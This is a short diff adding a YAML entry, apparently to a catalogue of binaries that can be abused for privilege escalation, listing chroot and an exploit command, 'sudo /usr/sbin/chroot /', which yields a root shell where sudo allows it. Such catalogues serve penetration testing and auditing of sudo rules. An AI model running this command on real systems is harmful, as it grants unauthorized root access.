@@ -1,0 +1,4 @@
+name: chroot
+binary_path: /usr/sbin/chroot
+exploit_cmds:
+- sudo /usr/sbin/chroot /
